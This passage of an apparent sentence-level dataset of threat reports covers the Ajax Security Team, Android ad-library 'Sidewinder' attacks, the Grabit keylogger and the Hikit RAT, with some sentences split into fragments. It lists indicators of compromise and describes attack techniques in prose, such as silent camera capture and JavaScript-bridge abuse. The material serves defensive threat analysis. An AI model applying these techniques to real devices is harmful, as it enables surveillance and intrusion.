tools may have been developed for less adept users .", "3332": "The CnC infrastructure consists of distinct , but linked , clusters that have targeted both the users of anti-censorship tools in Iran as well as defense contractor companies in the U.S .", "3333": "] org , which is registered to info @ usa.gov [ .", "3334": "] us .", "3335": "However , historical WHOIS information shows that the domain was registered by keyvan.ajaxtm @ gmail [ .", "3336": "] com-the same domain used to register ajaxtm [ .", "3337": "] org , the website of the Ajax Security Team .", "3338": "The same email addresses were used to register variations of domain names associated with popular services provided by companies such as Google , Facebook , Yahoo and LinkedIn .", "3339": "The second cluster comprises the CnC infrastructure used in the anti-censorship attacks .", "3340": "] com .", "3341": "The domain intel-update [ .", "3342": "] com resolved to the IP address 88.150.227.197 , which also hosted domains registered by osshom @ yahoo [ .", "3343": "] com , many of which are consistent with the pattern of registering domains with associations to Google and Yahoo services .", "3344": "] com .", "3345": "These two clusters are linked by a common IP address ( 5.9.244.151 ) , which is used by both ns2 .", "3346": "aeroconf2014 [ .", "3347": "] org and office.windows- essentials [ .", "3348": "] tk .", "3349": "A third cluster of activity was found via analysis of 1d4d9f6e6fa1a07cb0a66a9ee06d624a .", "3350": "The domain plugin-adobe [ .", "3351": "] com resolved to 81.17.28.235 .", "3352": "While analyzing the data from the victims , we found that the majority had either their timezone set to '' Iran Standard Time '' or had their language setting set to Persian : The largest concentration of victims is in Iran , based on the premise that Persian language settings and '' Iran Standard Time '' correlate the victim to be geographically located in Iran .", "3353": "The Ajax Security Team appears to have been formed by personas named '' HUrr ! c4nE ! '' and '' Cair3x '' in 2010 .", "3354": "Both members were engaged in website defacements prior to the forming of the Ajax Security Team , and both were members of Iranian hacker forums such as ashiyane [ .", "3355": "] org and shabgard [ .", "3356": "] org .", "3357": "Other members include '' 0day '' , '' Mohammad PK '' and '' Crim3r '' .", "3358": "The Ajax Security Team website at ajaxtm [ .", "3359": "] org had a Web forum with at least 236 members .", "3360": "The group published several exploits for content management systems and engaged in defacements .", "3361": "Initially , the defacements seemed to be motivated by a desire to demonstrate the group 's prowess-they even defaced an Iranian government website .", "3362": "However , the group appears to have become increasingly political .", "3363": "For example , in a blog post in 2012 , '' Cair3x '' announced the targeting of Iran's political opponents .", "3364": "In 2013 , the Ajax Security Team , and '' HUrr ! c4nE ! '' in particular , took part in '' # OpIsrael '' and '' # OpUSA '' .", "3365": "By early 2014 , the Ajax Security Team appears to have dwindled .", "3366": "There have been no defacements since December 2013 .", "3367": "The website and forum at ajaxtm [ .", "3368": "] org operated by '' HUrr ! c4nE ! '' , aka '' k3yv4n '' , is no longer active .", "3369": "'' HUrr ! c4nE ! '' has the most open/documented Internet persona of the Ajax Security Team .", "3370": "He registered the ajaxtm [ .", "3371": "] org domain name using the email address keyvan.ajaxtm @ gmail [ .", "3372": "] com .", "3373": "'' HUrr ! c4nE ! '' features prominently in all the group 's activities and defacements .", "3374": "Although there has been a decline in public-facing Ajax Security Team activity , this coincides with an increase in malware activity linked to the group 's infrastructure .", "3375": "The increasing politicization of the Ajax Security Team aligns with the timing of their activities against the perceived enemies of Iran .", "3376": "In addition to attacking companies in the U.S. , they have targeted domestic users of anti-censorship technology .", "3377": "While the objectives of this group are consistent with Iran 's efforts at controlling political dissent and expanding offensive cyber capabilities , the relationship between this group and the Iranian government remains inconclusive .", "3378": "In one case , '' HUrr ! c4nE ! '' , using the email address keyvan.ajaxtm @ gmail [ .", "3379": "] com , has been flagged for possible fraud by an online retailer .", "3380": "While '' HUrr ! c4nE ! '' is engaged in operations that align with Iran 's political objectives , he may also be dabbling in traditional cybercrime .", "3381": "This indicates that there is a considerable grey area between the cyber espionage capabilities of Iran's hacker groups and any direct Iranian government or military involvement .", "3382": "On the spectrum of state responsibility , these attacks align with state-encouraged attacks , which are defined as attacks in which : Third parties control and conduct the attack , but the national government encourages them as a matter of policy .", "3383": "Recruiting hackers through this model allows Iran to influence their activities , and provides the Iranian government plausible deniability , but a lack of direct control also means that the groups may be unpredictable and engage in unsanctioned attacks .", "3384": "The increased politicization of the Ajax Security Team , and the transition from nuisance defacements to operations against internal dissidents and foreign targets , coincides with moves by Iran aimed at increasing offensive cyber capabilities .", "3385": "While the relationship between actors such as the Ajax Security Team and the Iranian government is unknown , their activities appear to align with Iranian government political objectives .", "3386": "The capabilities of the Ajax Security Team remain unclear .", "3387": "This group uses at least one malware family that is not publicly available .", "3388": "We have not directly observed the Ajax Security Team use exploits to deliver malware , but it is unclear if they or other Iranian actors are capable of producing or acquiring exploit code .", "3389": "While the Ajax Security Team 's capabilities remain unclear , we know that their current operations have been somewhat successful as measured by the number of victims seen checking into to an Ajax Security Team controlled CnC server .", "3390": "We believe that if these actors continue the current pace of their operations they will improve their capabilities in the mid-term .", "3391": "FireEye has invented a purpose-built , virtual machine-based security platform that provides real-time threat protection to enterprises and governments worldwide against the next generation of cyber attacks .", "3392": "These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses , such as next-generation firewalls , IPS , anti-virus , and gateways .", "3393": "The FireEye Threat Prevention Platform provides real-time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors and across the different stages of an attack life cycle .", "3394": "The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .", "3395": "FireEye has over 1,500 customers across more than 40 countries , including over 100 of the Fortune 500 .", "3396": "We thank Kenneth Geers and Jen Weedon for their support and analysis on these findings .", "3397": "By 2014 , the number of Android users has grown to 1.1 billion and the number of Android devices has reached 1.9 billion .", "3398": "At the same time , enterprises are also embracing Android- based Bring Your Own Device ( BYOD ) solutions .", "3399": "For example , in Intel 's BYOD program , there are more than 20,000 Android devices across over 800 combinations of Android versions and hardware configurations .", "3400": "Although little malware has been found in Google Play , both Android apps and the Android system itself contain vulnerabilities .", "3401": "When the target is identified , a '' Sidewinder Targeted Attack '' exploits popular vulnerabilities in ad libraries , such as Javascript-binding-over-HTTP or dynamic- loading-over-HTTP , etc .", "3402": "It is a well-known challenge for an attacker to call Android services from injected native code that does n't have Android application context .", "3403": "Finally , we show that this threat is not only real but also prevalent due to the popularity of Android ad libraries .", "3404": "We hope this paper kickstarts the conversation on how to better protect the security and privacy in third-party libraries and how to further harden the Android security framework in the future .", "3405": "To understand the security risks brought by a Sidewinder Targeted Attack , we first explain one possible attack mechanism ( illustrated in Figure 1 ) that is similar to that of Sidewinder missiles .", "3406": "Like an infrared homing system , the attacker then seeks '' emission '' from ad libraries running on the target device to track and lock on it .", "3407": "Once the target is locked on , the attacker can launch advanced persistent attacks .", "3408": "Figure 2 shows a proof-of-concept attack control interface .", "3409": "This attack targets one of the ad libraries described in this paper .", "3410": "The security risks become obvious by looking at what the attacker can do with this control interface .", "3411": "Based on this precise position information , it is easy to identify individuals or groups of '' VIP '' targets by which offices they are in .", "3412": "In this section , we explain in more detail the risks of remote attacks on the Android devices .", "3413": "Android uses the JavaScript binding method addJavascriptInterface to enable JavaScript code running inside a WebView to access the app 's Java methods ( also known as the Javascript bridge ) .", "3414": "However , it is widely known that this feature , if not used carefully , presents a potential security risk when running on Android API 16 ( Android 4.1 ) or below .", "3415": "We call this the JavaScript-Binding-Over-HTTP ( JBOH ) vulnerability .", "3416": "This applies to insecure HTTPS channels as well .", "3417": "Based on the official data in June 2014 , ~60 % of Android devices are still running API\u226416 .", "3418": "Note that API > 16 platforms are not necessarily secure .", "3419": "If the app is targeting at a lower API level , Android will still run it with the lower API level for compatibility reasons .", "3420": "Figure 3 shows the targeted API of popular Google Play apps , each of which has over 50,000 downloads .", "3421": "We can see that a large portion of apps are targeting at API\u226416 .", "3422": "Starting with Android 4.2 ( API > 16 ) , Google introduced the @ JavascriptInterface anno- tation to explicitly designate and restrict which public Java methods in the app were accessible from JavaScript running inside a WebView .", "3423": "We call these exposed JS binding annotation interfaces '' JS Sidedoors .", "3424": "'' For example , we found a list of sensitive Javascript interfaces that are publicly ex- posed from certain versions of a real-world ad library : createCalendarEvent , makeCall , postToSocial , sendMail , sendSMS , takeCameraPicture , getGalleryImage , registerMicListener , etc .", "3425": "Similar to JBOH , DEX loading over HTTP or insecure HTTPS ( DLOH ) is another serious issue raised by ad libraries .", "3426": "It appears this method makes sending SMS easy .", "3427": "However , some other operations require Android context or registering Java callbacks .", "3428": "Android context provides an interface to the global information about an app 's environment .", "3429": "Many Android functionalities , especially remote call invocations , are encapsulated in the context .", "3430": "We discuss attacks requiring context in a later section .", "3431": "In this section , we explain attacks that do n't need Android context , and discuss their security risks .", "3432": "Commercial one-touch root apps claim they can root more than 1,000 brands ( > 20,000 models ) .", "3433": "towelroot , which exploits a bug found recently in Linux kernel , claims that it can root most new devices released before June 2014 .", "3434": "Although only processes with root privilege can ptrace others , child processes are able to ptrace their parents .", "3435": "Because the shell launched from the Javascript bridge is a child process of the host app , it can ptrace the host app 's process .", "3436": "Note that only apps with android : debuggable set as '' true '' in the manifest can be ptraced , which limits its adoption .", "3437": "Sending SMS does not require context or user interaction .", "3438": "s16 is the type marker represents '' 16 bit string , '' and packageName is the host app 's package name , where we can obtain from the information posted from the ad libraries .", "3439": "The sequence number of the remote calls can be found in the corresponding Android Interface Definition Language ( AIDL ) files .", "3440": "Many other Android services can be invoked in the same way , including sending SMS As mentioned , it is more convenient to directly obtain the Android context via the Javascript bridge .", "3441": "Code in Listing 4 , for example , is an easy way to get context from anywhere of the application .", "3442": "Operations like taking pictures and recording videos need to register Java callbacks .", "3443": "The attackers either need to boot a Java VM from the Javascript bridge , or to inject code into the host app 's Java VM .", "3444": "Fortunately , Android Runtime offers another way to load Java Native Interface ( JNI ) code into the host app using Runtime.load ( ) .", "3445": "There are other ways to obtain Android context , like reflecting to the private static context variable of WebView .", "3446": "However , without Java VM instances , it 's difficult to take pictures and record videos .", "3447": "After our submission to Black Hat in April 2014 , we noticed that MWR was also concurrently and independently working on this issue .", "3448": "They published a similar mechanism in June 2014 .", "3449": "Android users may perform copy-paste on important text content .", "3450": "For example , there are many popular password-management apps in Google Play , enabling the users to click-and-copy passwords and paste them into login forms .", "3451": "Android has no permissions restricting apps from accessing the global clipboard .", "3452": "We have notified Google about this issue .", "3453": "Android Open Source Project ( AOSP ) classifies Android permissions into several protec- tion levels : '' normal , '' '' dangerous , '' '' system , '' '' signature '' and '' development '' , , .", "3454": "Dangerous permissions '' may be displayed to the user and require confirmation before pro- ceeding , or some other approach may be taken to avoid the user automatically allowing the use of such facilities .", "3455": "'' In contrast , normal permissions are automatically granted at installation , '' without asking for the user 's explicit approval ( though the user always has the option to review these permissions before installing ) '' .", "3456": "If an app requests both dangerous permissions and normal permissions , Android only displays the dangerous per- missions by default .", "3457": "If an app requests only normal permissions , Android does n't display any permission to the user .", "3458": "We have found that certain '' normal '' permissions have dangerous security impacts .", "3459": "These two permissions enable an app to query , insert , delete , or modify all launcher configuration settings , including icon insertion or modification .", "3460": "After our notification , Google has patched this vulnerability in Android 4.4.3 and has released the patch to its OEM partners .", "3461": "However , according to Google , by 7 July 2014 , 17.9 % Android devices are using Android 4.4 .", "3462": "Given that Android 4.4.2 and below has this vulnerability , over 82.1 % Android devices are vulnerable .", "3463": "With the CHANGE WIFI STATE permission , Android processes can change the proxy settings of WIFI networks ( not solely the currently connected one ) .", "3464": "To do this , the attacker can use the remote calls exposed by WifiManager to obtain the WifiConfiguration objects , then create new proxySettings to replace to a corresponding field .", "3465": "Note that the proxySettings field is a private Java field not intended to be accessed by other processes .", "3466": "Unfortunately , the flexible and powerful Java reflection mechanism ( especially the forName ( ) , getField ( ) , setAccessible ( ) calls ) exposes such components to the attackers for arbitrary read or write operations .", "3467": "Android audio recording via the MediaRecorder APIs does not need user interaction or consent , which makes it easy to record sound in the background .", "3468": "On the contrary , taking pictures and recording videos are more challenging .", "3469": "First , this requires registering Java callbacks .", "3470": "Second , Android warns that '' Preview must be started before you can take a picture '' .", "3471": "It seems that taking pictures and recording videos without user notification is impossible .", "3472": "However , security largely depends on the correct implementation and enforcing a flawless implementation is difficult .", "3473": "On some of the popular phones ( models anonymized for security consideration ) , startPreview ( ) is required to take pictures/record videos ; However , it 's highly possible that on these devices takePicture ( ) fails to check whether a view has been presented to the user .", "3474": "Fortunately , we have never witnessed a case where the MediaRecorder can shoot videos without calling setPreviewDisplay .", "3475": "But we were able to create and register a dummy SurfaceView to the WindowManager , which made taking photos and videos possible even on devices that properly checked for an existing preview .", "3476": "It is well known that communication via HTTP is prone to hijacking and data tamper- ing .", "3477": "Switching to HTTPS may not solve this issue since the HTTPS security relies on a flawless implementation , which is difficult .", "3478": "For example , there are cases where the developer failed ( intentionally or unintentionally ) to check the server 's certificate .", "3479": "We found that some of the most popular ad libraries ( see Table 3 ) have this issue .", "3480": "Note that even if the ad libraries have a correct and rigorous implementation , the SSL library itself may contain serious vulnerabilities that can be exploited by MITM attacks , .", "3481": "Almost every ad library uploads local information from Android devices .", "3482": "Based on our observations , they do so mostly for purposes such as checking for platform compatibility and user interest targeting .", "3483": "The information most frequently uploaded includes IMEI , Android version , manufacturer , Android ID , device specification , carrier information , host app information , installed app list , etc .", "3484": "Table 3 lists the info uploaded from the top five popular ad libraries .", "3485": "Listing 7 is a captured packet posted to the remote ad server by one of the ad libraries .", "3486": "It is captured from a popular Google Play app .", "3487": "From this packet we can tell the device 's screen density ( d-device-screen-density ) , screen size ( d-device- screen-size ) , host app 's pack- age name ( u-appBId ) , host app 's name ( u-appDNM ) 1 , host app 's version ( u-appVer ) , user agent ( h-user-agent ) , localization ( d-localization ) , mobile network type ( d-netType ) , screen orientation ( d-orientation ) , and GPS location ( u-latlong-accu ) .", "3488": "The most important infor- mation is the GPS location , where the victim 's latitude , longitude and the location precision are shown .", "3489": "It is reasonable for an ad to obtain this information to improve the ad-serving experience .", "3490": "To locate victims effectively , an attacker needs to monitor large-scale network traffic containing such private information .", "3491": "DNS hijacking is legally and maliciously used in many situations including traffic management , phishing and censorship .", "3492": "Historically , there were many BGP hijacking attacks that affected YouTube , DNS root servers , Yahoo , and many other important Internet services .", "3493": "We used the FireEye Mobile Threat Prevention ( MTP ) engine to analyze all of the ~73,000 popular apps from Google Play with more than 50,000 downloads , and identified 93 ad libraries .", "3494": "The detailed ad library inclusion statistics are shown in Figure 4 .", "3495": "Seventy-one % of the apps contain at least one ad library , 35 % have at least two ad libraries , and 22.25 % include at least three ad libraries .", "3496": "The largest ad inclusion number is 35 .", "3497": "Since Google is cautious about the security of the products it directly controls , we exclude Google Ad from the following discussion .", "3498": "For security considerations , in this paper we anonymize the names of the other 92 ad libraries , using Ad1 , Ad2 , ...", "3499": ", Ad92 to refer to them , where the subscripts represent the rankings of how many apps include the ad libraries .", "3500": "The top five popular ad libraries ' inclusion and download statistics are listed in Table 2 .", "3501": "We analyzed the 92 ad libraries found in the popular Google Play apps , and summa- rized the communication channel vulnerabilities in Table 3 .", "3502": "Combined with the uploaded information column we can learn about the data the attackers can obtain .", "3503": "Fifty-seven of the 92 ad libraries in the popular Google Play apps have the JBOH issue .", "3504": "Specifically , four of the top five ad libraries are subject to this problem ( shown in Table 2 ) .", "3505": "Seven of the 92 ad libraries are prone to DLOH attacks .", "3506": "Particularly , some versions of Ad5 in Table 3 have this problem .", "3507": "The affected Google Play apps number and the accumulated download counts are listed in Table 4 .", "3508": "Millions of users are still under the threat of Sidewinder Targeted Attacks .", "3509": "First we need to improve the security and privacy protection of ad libraries .", "3510": "For example , we encourage ad libraries ' publishers to use HTTPS with proper SSL certificate validation , and to properly encrypt network traffic .", "3511": "Meanwhile , Google itself needs to further harden the security framework .", "3512": "This may prove difficult because : 1 .", "3513": "Android is a complex system .", "3514": "Any sub- component 's vulnerability may impact the security of the whole system .", "3515": "Fragmentation makes the situation even more challenging .", "3516": "2 .", "3517": "The trade-off between usability , performance and security always matters , and market demand frequently dictates that security comes last .", "3518": "Many Android developers do not even understand how to program securely ( as shown in the JBOH issue ) .", "3519": "3 .", "3520": "Many security patches are not back-ported to old versions of Android ( like the launcher settings problem described earlier ) , even though older versions are widely used .", "3521": "4 .", "3522": "There is always information asymmetry in the development chain .", "3523": "For example , it usually takes several months for vendors to apply security patches after Google releases them .", "3524": "Albeit challenging , we hope that this work can kickstart a conversation , both on improved security and privacy protection in third-party libraries and on a hardened Android security framework .", "3525": "FireEye has invented a purpose-built , virtual machine-based security platform that provides real-time threat protection to enterprises and governments worldwide against the next generation of cyber attacks .", "3526": "These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses , such as next-generation firewalls , IPS , anti-virus , and gateways .", "3527": "The FireEye Threat Prevention Platform provides real-time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors and across the different stages of an attack life cycle .", "3528": "The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .", "3529": "FireEye has over 1,900 customers across more than 60 countries , including over 130 of the Fortune 500 .", "3530": "Not so long ago , Kaspersky clients in the United States approached Kaspersky researchers with a request to investigate a new type of malicious software that they were able to recover from their organizations ' servers .", "3531": "The malware calls itself Grabit and is distinctive because of its versatile behavior .", "3532": "Every sample we found was different in size and activity from the others but the internal name and other identifiers were disturbingly similar .", "3533": "The timestamp seems valid and close to the documented infection timeline .", "3534": "Our documentation points to a campaign that started somewhere in late February 2015 and ended in mid- March .", "3535": "As the development phase supposedly ended , malware started spreading from India , the United States and Israel to other countries around the globe .", "3536": "All of the dozens of samples we managed to collect were programmed in Windows machine 32bit processor , over the Microsoft .NET Framework ( Visual Basic / C # ) .", "3537": "Files were compiled over the course of three days , between March 7th and 9th of 2015 .", "3538": "The following chart illustrates how the group or individual created the samples , the size of each sample , the time of the day when each was compiled and the time lapses between each compilation .", "3539": "The smallest sample ( 0.52Mb ) and the largest ( 1.57Mb ) were both created on the same day , which could indicate experiments made by the group to test features , packers and \" dead code \" implementations .", "3540": "Looking at the chart , it is interesting to see the modus operandi as the threat actor consistently strives to achieve a variety of samples , different code sizes and supposedly more complicated obfuscation .", "3541": "Along with these different sizes , activities and obfuscation , a serious encryption algorithm was also implemented in each one of them .", "3542": "The proprietary obfuscated string , methods and classes made it rather challenging to analyze .", "3543": "ASLR is also enabled , which might point to an open source RAT or even a commercial framework that packed the malicious software in a well written structure .", "3544": "This type of work is known as a mitigation factor for threat actors to keep their code hidden from analysts ' eyes .", "3545": "During our research , dynamic analysis showed that the malicious software 's \" call home \" functionality communicates over obvious channels and does not go the extra mile to hide its activity .", "3546": "In addition , the files themselves were not programmed to make any kind of registry maneuvers that would hide them from Windows Explorer .", "3547": "Taking that into an equation , it seems that the threat actors are sending a \" weak knight in a heavy armor \" to war .", "3548": "It means that whoever programmed the malware did not write all the code from scratch .", "3549": "A well trained knight would never go to war with a blazing shield and yet a stick for a sword .", "3550": "Looking into the \" call home \" traffic , the Keylogger functionality prepares files that act as a container for keyboard interrupts , collecting hostnames , application names , usernames and passwords .", "3551": "However , the interesting part lies here .", "3552": "The file names contain a very informative string .", "3553": "HawkEye_Keylogger_Execution_Confirmed_<VICTIM > 3.10.2015 6:08:31 PM HawkEye is a commercial tool that has been in development for a few years now ; it appeared in 2014 , as a website called HawkEyeProducts , and made a very famous contribution to the hacker community .", "3554": "In the website , the product shows great versatility as it contains many types of RATs , features and functionality , such as the traditional HawkEye Logger or other types of remote administration tools like Cyborg Logger , CyberGate , DarkComet , NanoCore and more .", "3555": "It seems to support three types of delivery : FTP , SMTP and Web - Panel .", "3556": "One of the threat actor 's successful implementations contained the well - known DarkComet .", "3557": "This convenient \" choose your RAT \" functionality plays a very important role in the malware infection , routine and survival on the victim 's machine .", "3558": "The DarkComet samples are more complicated than the traditional HawkEye logger .", "3559": "One instance had a random key generator which sets an initialization vector of the first 4 bytes of the executable file and appends a random 5 byte key that unpacks another PE file , less than 20Kb in size .", "3560": "The PE file then contains another packer with an even more challenging obfuscation technique .", "3561": "The last sample we tested had still more complicated behavior .", "3562": "The code itself had the same obfuscation technique , though traffic was not transferring in clear text .", "3563": "This means that the group is trying to produce other types of malicious samples with different RATs .", "3564": "Approximately 10,000 stolen files have been collected .", "3565": "Companies based in Thailand and India had the largest percentage of infected machines .", "3566": "By looking at the stolen credentials , it is very clear that employees sent the malware to one another , as stolen host names and internal applications are the same .", "3567": "The following is the full chart , updated to May 2015 .", "3568": "Malware distribution by country Demonstrating the effectiveness of their simple Keyloggers , one C2 ( on May 15th ) maintained thousands of victim account credentials from hundreds of infected systems .", "3569": "To sum it up , Grabit threat actors did not use any sophisticated evasions or maneuvers in their dynamic activity .", "3570": "It is interesting to see the major differences between the core development of the malware and the actual functionality it uses .", "3571": "Some malware samples used the same hosting server , and even the same credentials .", "3572": "Could it be that our threat actor was in a hurry ? Our guess is that we are looking at a group and not an individual .", "3573": "Some members of the group are more technical than the others and some are more security oriented and aware of the risks they might expose themselves to .", "3574": "Back to square one .", "3575": "This macro simply opens a socket over TCP and sends an HTTP request to a remote server that was hacked by the group to serve as a malware hub , before downloading the malware .", "3576": "In some cases the malicious macro was password protected , but our threat actor might have forgotten that a .doc file is actually an archive and when that archive is opened in a convenient editor of your choice , the macro strings are shown in clear - text .", "3577": "Its binaries are not deleted in most cases , and its communication is in clear- text , where the victim can sniff the communication and grab the FTP / SMTP server 's credentials .", "3578": "Malware derivatives are mainly located in .", "3579": "C:\\Users\\ < user > \\AppData\\Roaming\\Microsoft Phishing extensions : .doc 3f77403a64a2dde60c4962a6752de601d56a621a 4E7765F3BF73AEC6E350F412B623C23D37964DFC Icons : .pdf , .doc , .ttf , .xls , .ppt , .msg , .exe Stealer : .txt , .jpeg , .eml Additional Executable names .", "3580": "Malware extensions : .zip or .exe IP Addresses .", "3581": "The driver component of Gen 1 and Gen 2 are drastically different in their operation and intent .", "3582": "For the Gen 1 sub-family of Hikit , the driver acts as a NDIS ( network ) driver that is responsible for interfacing the DLL to the network while preventing a direct WinSock interface from occurring .", "3583": "The trigger string varies by Driver and DLL sample .", "3584": "Gen 2 uses a standard client-server malware model meaning that the malware no longer requires a direct Internet-facing network card , no longer uses a network driver for networking , and provides the ability to network multiple Gen 2 samples behind a firewall with greater ease ( from the attacker's perspective ) .", "3585": "The Gen 2 sub-family , however , no longer employs network stealth provided by the Gen 1 network driver which exposes the C2 server addresses to analysts .", "3586": "Each of the Hikit generations contains multiple sub-generations as the author ( s ) of Hikit have evolved their code over time .", "3587": "There is a noticeable steep improvement over the code base of Gen 1 Hikit family during its 2011 development period .", "3588": "The Gen 2 sub-generations share a similar improvement scale between late 2011 and late 2013 .", "3589": "The earliest known Hikit sample dates back to 31 March 2011 .", "3590": "Known as the Gen 1.0 sub-generation of Hikit Gen 1 , the first known sample of Hikit deviated from the later traditional Gen 1 model .", "3591": "The Gen 1.0 sample was a standalone executable whereas subsequent Gen 1 sub-generations use a DLL running as a service .", "3592": "The Gen 1.0 sample is clearly a work-in-progress .", "3593": "The Gen 1.0 sample , while different than subsequent sub-generations , does still rely on the Driver component and for the most part the structure of the code does not differ much going forward into the Gen 1 evolution .", "3594": "Less than three weeks after Gen 1.0 , the author ( s ) of Hikit move into Gen 1.1 .", "3595": "The notable change is that the Hikit model of using a DLL and driver , which has remained until present day , comes into being .", "3596": "The code matures slightly between Gen 1.0 and Gen 1.1 but the functionality does not change .", "3597": "Both Gen 1.0 and Gen 1.1 use plaintext data transmissions .", "3598": "Development appears to halt on Gen 1 for 4 months between 20 June 2011 and 23 October 2011 based on a lack of available samples found .", "3599": "During this time the development of Hikit appears to change locations .", "3600": "Gen 1 samples have Program Database ( PDB ) file strings that identify the file path of the Hikit source code .", "3601": "For Gen 1.0 and Gen 1.1 samples , the file path of the Hikit source code is consistently h : \\JmVodServer\\hikit .", "3602": "Starting with Gen 1.2 , the file path switches to e : \\SourceCode\\hikitnew .", "3603": "It is at this time that the functionality of Hikit Gen 1 begins to mature .", "3604": "A more subtle change is the renaming of the '' socks5 '' command to simply '' proxy '' within the code .", "3605": "The code within Hikit begins to mature but the overall functionality does not expand beyond the original set of commands found in Gen 1.0 .", "3606": "The other remarkable change within the Gen 1.1 to Gen 1.2 development is the way in which the session handshake trigger operates .", "3607": "In Gen 1.0 and Gen 1.1 , the DLL instructs the Driver to listen for a specific string ( typically a HTTP request string ) and responds with another string .", "3608": "In Gen 1.2 , the Driver has a hardcoded trigger string ( a specific HTTP request string ) and the DLL instructs the Driver to inspect a specific HTTP header field for a specific hexadecimal value .", "3609": "This moves Gen 1.2 into more of a username/password authentication scheme whereas previous sub-generations could potentially be accessed by accidental HTTP requests .", "3610": "At the same time , the Driver responds with a specific value with in the Etag HTTP header field .", "3611": "This places Gen 1.2 into a more stealth position as a random , non-HTTP compliant response from Gen 1.0 and Gen 1.1 samples is more obvious than a legitimate HTTP response with a specially crafted Etag header .", "3612": "Gen 1.2 's development cycle appears to exist between 23 October 2011 and 2 November 2011 with several new samples being found on the Internet having legitimate compile times during this time window .", "3613": "There is , however , evidence that the development of Hikit Gen 1 and Gen 2 overlap by several months .", "3614": "The earliest Gen 2 sample known to exist dates to 28 August 2011 , two months before the first known Gen 1.2 sample .", "3615": "The last known Gen 1.2 sample , and by extension , the last known Gen 1 sample , dates to 9 April 2012 .", "3616": "The first known Gen 2 sub-generation , Gen 2.0 Alpha , much like Gen 1.0 , represents an early development version of the Gen 2 Hikit sub-family .", "3617": "Gen 2.0 Alpha is a stand-alone Windows console executable that can run as a service executable .", "3618": "Gen 2.0 Alpha supports the same commands as Gen 1.2 with an additional command that returns the infection 's configuration information .", "3619": "On 9 February 2012 the first known sample for Gen 2.0 Beta is compiled by the developer ( s ) of Hikit .", "3620": "Also a stand-alone console executable like Gen 2.0 Alpha , the Gen 2.0 Beta code changes internally without providing significant functionality improvements with the exception of now the executable uses a device driver to hide network , file , and registry artifacts related to its operation .", "3621": "Both Gen 2.0 Alpha and Gen 2.0 Beta still retain PDB file path information within their binaries .", "3622": "During the development phase of Gen 2.0 Alpha , development of the Gen 2.0 Alpha variants changes locations .", "3623": "First version of the Gen 2.0 Alpha malware , from 28 August 2011 , has the PDB path located in H : \\JmVodServer\\Matrixnew2 whereas the file path for later Gen 2.0 Alpha and Gen 2.0 Beta binaries has the PDB path in E : \\SourceCode\\Matrixnew which suggests that the source code for both Gen 1 and Gen 2 existed on the same machine and moved at roughly the same time .", "3624": "This may indicate either a single developer or a team ( or set of teams ) with shared resources .", "3625": "The first known Gen 2.1 binary has a compile date of 17 April 2012 .", "3626": "Gen 2.1 represents the first Gen 2 sub-generation to use an executable-based loader , DLL and driver model , a model that all subsequent Gen 2 sub-generations employ .", "3627": "The functionality of the Gen 2.1 sub-generation is the same as the previous generations with no new commands being introduced .", "3628": "Gen 2.1 is the first sub-generation in the Gen 2 sub-family to introduce 64-bit binaries .", "3629": "The Gen 2.2 sub-generation appears to have begun on 20 July 2012 .", "3630": "Gen 2.2 is notable for altering where the configuration information of the RAT is stored and using both DLL-based and executable- based loaders .", "3631": "Also notable is the fact that the sub-generation spans a significant amount of time with intermittent periods of development .", "3632": "The bulk of the Gen 2.2 samples that have the tell-tale marks of being the product of a builder have a compile date of 26 July 2013 , a full year after the first known Gen 2.2 sample .", "3633": "Between 21 July 2012 and 20 February 2013 , there are no known Gen 2.2 binaries .", "3634": "The two 20 July 2012 samples have different compile times indicating they were not the product of a builder but rather unique compilations .", "3635": "Between 21 February 2013 and 27 February 2013 , there are 4 unique compilation dates for the DLL component with 7 unique , known Gen 2.2 DLLs .", "3636": "The bulk of Gen 2.2 samples have a compile date of 26 July 2013 .", "3637": "There are approximately 25 known Gen 2.2 DLLs with the 26 July 2013 compile date .", "3638": "The Gen 2.2 sub-generation appears to exist through at least 19 September 2013 .", "3639": "The last known Gen 2 sub-generation , Gen 2.3 , began on 12 December 2013 .", "3640": "Gen 2.3 is notable for its use of a legitimate SSL certificate as part of the handshake between the infected machine and the attacker 's C2 .", "3641": "Another interesting aspect of the Gen 2.3 sub-generation is that there is no longer a marker to designate the beginning of the embedded configuration .", "3642": "Gen 2.1 and Gen 2.2 uses a specific string to indicate the beginning of the embedded configuration presumably in order to allow the builder to locate the configuration space when constructing a new configuration for the binaries .", "3643": "Gen 2.3 , however , uses a specific location instead , requiring the builder to calculate the specific location using the PE/COFF header of the binary .", "3644": "Also , while Gen 2.1 and Gen 2.2 retain the configuration within the DLL component , Gen 2.3 stores the configuration within the loader component .", "3645": "This allows the attackers to configure the loader without having to update the DLL .", "3646": "The evolution of Hikit is a long and drawn out series of small , incremental development changes .", "3647": "The important take away from the evolution of Hikit is that the developers for Gen 1 appear to have changed in late 2011 and development of Gen 2 has a several month overlap with the development and usage of Gen 1 .", "3648": "The following table provides a quick reference to the generational ( and sub-generational ) designations of Hikit .", "3649": "The Driver component for Hikit varies based on the specific Hikit sub-family ( Gen 1 or Gen 2 ) .", "3650": "As such it is necessary to describe each in the context of its specific sub-family .", "3651": "The Driver component of Gen 1 Hikit variants provides the interface between the victim 's network interface card ( NIC ) and the DLL .", "3652": "The Driver is a NDIS ( network ) driver that integrates into the victim's network stack .", "3653": "When the Driver removes data from the network stack , the Driver stores the removed data in local buffers for the Gen 1 DLL to query against .", "3654": "In order to interact with the Driver , the DLL uses the function The Driver will remove data from the network stack only if a new channel is being established .", "3655": "A new channel occurs when the Driver detects a trigger string .", "3656": "The trigger string is typically a short form HTTP request with the following trigger strings found in the wild : Up to and including Gen 1.1 Drivers required the DLL to specify the trigger string in addition to the authentication value whereas Gen 1.2 Drivers had the trigger strings hardcoded .", "3657": "In Gen 1.2 , whenever the Driver detects a trigger string , the Driver inspects the rest of the data received for the authentication value .", "3658": "If the token follows the trigger string ( there is no specific limitation on how far from the trigger string the password token must be ) , then the Driver generates a new channel that the DLL will use as the conduit between the DLL and the client .", "3659": "The Driver appears to be based off the NDIS example source code PassThru .", "3660": "More specifically , the author ( s ) of the Driver appear to have used the modified version of the PassThru example , PassThruEx , by James Antognini and Thomas Devine from a 